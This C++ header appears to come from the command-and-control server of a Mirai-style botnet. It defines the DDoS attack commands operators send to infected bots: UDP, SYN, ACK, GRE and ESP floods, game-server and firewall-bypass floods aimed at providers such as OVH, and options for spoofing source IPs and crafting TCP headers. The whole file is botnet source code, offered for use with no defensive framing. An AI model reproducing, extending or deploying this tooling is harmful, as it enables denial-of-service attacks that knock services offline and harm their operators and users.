#pragma once

#include <map>
#include <string>
#include <list>

#include "def.h"

struct command
{
    uint8_t *buf;
    uint32_t buf_len;
} PACKED;

struct process
{
    int fd;
    std::string buf;
    int buf_len;
    struct admin *ptr;
    int count;
    std::string f;
};

static std::map<std::string, uint8_t> flags =
{
    {"port", OPT_PORT},
    {"size", OPT_SIZE},
//    {"threads", OPT_THREAD_COUNT},
    {"path", OPT_HTTP_PATH},
    {"connection", OPT_HTTP_CONNECTION},
    {"domain", OPT_DOMAIN},
    {"ttl", OPT_TTL},
    {"sport", OPT_SOURCE_PORT},
    {"ack", OPT_TCP_ACK},
    {"fin", OPT_TCP_FIN},
    {"urg", OPT_TCP_URG},
    {"psh", OPT_TCP_PSH},
    {"rst", OPT_TCP_RST},
    {"syn", OPT_TCP_SYN},
    {"tos", OPT_TOS},
    {"id", OPT_ID},
    {"seq", OPT_TCP_SEQ},
    {"source_ip", OPT_SOURCE_IP},
    {"ack_seq", OPT_ACK_SEQ}
};

static std::map<std::string, std::string> flag_description =
{
    {"port", "Port given to specify the destination port of the flood (default random)"},
    {"size", "Size of each request sent by the flood (default 900)"},
//    {"threads", "Desired thread count for the specified flood (default 1)"},
    {"path", "HTTP path (default /)"},
    {"connection", "HTTP connection type (default close)"},
    {"domain", "Desired domain to be resolved by the flood"},
    {"ttl", "IP header TTL (default 255)"},
    {"sport", "TCP header source port (default random)"},
    {"ack", "ACK flag set in TCP header (default 1 depending on the flood type)"},
    {"fin", "FIN flag set in TCP header"},
    {"urg", "URG flag set in TCP header"},
    {"psh", "PSH flag set in TCP header"},
    {"rst", "RST flag set in TCP header"},
    {"syn", "SYN flag set in the TCP header (default 1 depending on the flood type)"},
    {"tos", "IP header TOS"},
    {"id", "IP header ID (default random)"},
    {"sequence", "TCP header sequence (default random)"},
    {"source_ip", "IP header source IP (255.255.255.255 for random)"},
    {"ack_sequence", "TCP header ACK sequence"}
};

static std::map<std::string, uint8_t> command_ids =
{
    {"!udp", FLOOD_UDPFLOOD},
    {"!tcpsyn", FLOOD_SYNFLOOD},
    {"!tcpack", FLOOD_ACKFLOOD},
    {"sockethold", FLOOD_TCPSOCKET},

    {"!udpplain", FLOOD_UDPPLAIN},
    {"!tcpovh", FLOOD_SYNPLAIN},
    {"!ackplain", FLOOD_ACKPLAIN},

    {"!tcpmix", FLOOD_SYNACK},
    {"!protocol",  FLOOD_PROTORAND},
    //{"!tcpconn", FLOOD_ACKPSH},
    {"!udpbypass", FLOOD_BYPASS},
    {"!ethernet",FLOOD_UDPGRE},
    {"!ipsec", FLOOD_UDPESP},
    {"!hex", FLOOD_UDPHEX},
    {"!udpfivem", FLOOD_UDPFIVEM},
    {"!vsebypass", FLOOD_UDPVSE},
    {"!tcpstomp", FLOOD_TCPSTOMP}
};

static std::map<std::string, std::list<uint8_t>> commands =
{
    {"sockethold", {OPT_SOURCE_IP, OPT_PORT}},
    {"!udp", {OPT_PORT, OPT_SIZE}},
    {"!udpplain", {OPT_PORT, OPT_SIZE}},
    {"!udpbypass", {OPT_PORT, OPT_SIZE}},
    {"!tcpack", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_TCP_ACK,
             OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN,
             OPT_TOS, OPT_ID, OPT_TCP_SEQ, OPT_SOURCE_IP, OPT_ACK_SEQ}},

    {"!ethernet", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_TCP_ACK,
             OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN,
             OPT_TOS, OPT_ID, OPT_TCP_SEQ, OPT_SOURCE_IP, OPT_ACK_SEQ}},
    {"!vsebypass", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_TCP_ACK,
             OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN,
             OPT_TOS, OPT_ID, OPT_TCP_SEQ, OPT_SOURCE_IP, OPT_ACK_SEQ}},
    {"!protocol", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_TCP_ACK,
             OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN,
             OPT_TOS, OPT_ID, OPT_TCP_SEQ, OPT_SOURCE_IP, OPT_ACK_SEQ}},
    {"!ipsec", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_TCP_ACK,
             OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN,
             OPT_TOS, OPT_ID, OPT_TCP_SEQ, OPT_SOURCE_IP, OPT_ACK_SEQ}},
    {"!udpfivem", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_TCP_ACK,
             OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN,
             OPT_TOS, OPT_ID, OPT_TCP_SEQ, OPT_SOURCE_IP, OPT_ACK_SEQ}},
    {"!hex", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_TCP_ACK,
             OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN,
             OPT_TOS, OPT_ID, OPT_TCP_SEQ, OPT_SOURCE_IP, OPT_ACK_SEQ}},
    {"!tcpsyn", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_TCP_ACK,
             OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN,
             OPT_TOS, OPT_ID, OPT_TCP_SEQ, OPT_SOURCE_IP, OPT_ACK_SEQ}},
    {"!synack", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_TCP_ACK,
              OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN,
              OPT_TOS, OPT_ID, OPT_TCP_SEQ, OPT_SOURCE_IP, OPT_ACK_SEQ}},
    {"!ackplain", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_TCP_ACK,
              OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN,
              OPT_TOS, OPT_ID, OPT_TCP_SEQ, OPT_SOURCE_IP, OPT_ACK_SEQ}},
    {"!tcpovh", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_TCP_ACK,
              OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN,
              OPT_TOS, OPT_ID, OPT_TCP_SEQ, OPT_SOURCE_IP, OPT_ACK_SEQ}},
    {"!tcpmix", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_TCP_ACK,
              OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN,
              OPT_TOS, OPT_ID, OPT_TCP_SEQ, OPT_SOURCE_IP, OPT_ACK_SEQ}},
    {"!tcpstomp", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_TCP_ACK,
              OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN,
              OPT_TOS, OPT_ID, OPT_TCP_SEQ, OPT_SOURCE_IP, OPT_ACK_SEQ, OPT_DOMAIN, OPT_HTTP_CONNECTION, OPT_HTTP_PATH}}
};

static std::map<std::string, std::string> command_description =
{
    {"gudp", "udp flood optimized for high gbps"}, // optimized for more gbps
    {"bypass", "udp flood optimized for bypass"}, // random header to bypass rules firewalls like ovh
    {"plain", "udp flood optimized for high gbps"}, // optimized for more pps
    {"pack", "ack flood optimized for high pps"}, // optimized for more pps
    {"psyn", "syn flood optimized for high pps"}, // optimized for more pps
    {"ackplain", "ack flood optimized for high pps"}, // optimized for more pps
    {"synack", "syn-ack flood optimized for high pps"}, // optimized for more pps
    {"ackseq", "ack-psh flood optimized for high pps"}, // optimized for more gbps
    {"ethflood", "ack-psh flood optimized for high pps"}, // optimized for more gbps
    {"rawudp", "rawudp strong optimized method for bypass"}, // optimized for more gbps
    {"hexudp", "udp private hex payload"}, // optimized for more gbps
    {"fivem", "fivem special udp flooding bypass"},
    {"sockethold", "hold sockets open"} // optimized for more gbps

};
